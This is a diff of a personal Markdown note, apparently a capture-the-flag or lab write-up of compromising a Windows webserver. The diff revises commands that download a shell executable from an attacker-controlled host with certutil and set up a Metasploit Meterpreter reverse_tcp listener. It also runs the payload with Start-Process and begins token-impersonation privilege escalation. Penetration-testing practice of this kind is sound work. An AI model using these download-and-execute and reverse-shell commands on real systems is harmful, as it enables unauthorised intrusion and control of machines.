@@ -139,7 +139,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.9.3.69:909
 The above method was giving issues, so i tried using: Certutil
 
 ```
-certutil -urlcache -f http://10.9.0.78:8000/SHELL.exe SHELL.exe
+certutil -urlcache -f http://10.9.3.69:9090/switch_shell.exe switch_shell.exe
 ```
 
 ![[Pasted image 20251013224956.png]]
@@ -149,14 +149,14 @@ Certutil seems to have worked~~
 ---
 ## Setup a Meterpreter Listener 
 ```
-msfconsole -q -x "use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.9.0.78 set 9090 listening-port run"
+msfconsole -q -x "use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 10.9.3.69 set 9090 listening-port run"
 ```
 ![[Pasted image 20251013222045.png]]
 
 ## Execute the payload on the webserver
 use the following command in the shell code on the webserver
 ```
-Start-Process "shell_main.exe"
+Start-Process "switch_shell.exe"
 ```
 
 OR 
@@ -166,8 +166,21 @@ OR
 ```
 
 ## Shell obtained
-![[Pasted image 20251013225732.png]]
+![[Pasted image 20251014202242.png]]
 
 # Priv Esc
 
+## Token Impersonation
+### View all privileges 
+1. Change the meterpreter to a shell
+```
+shell
+```
+2. View the privileges of the user
+```bash
+whoami /priv
+```
 
+![[Pasted image 20251014202749.png]]
+
+- We see that there are two privilege that are enabled whilst the others are disabled
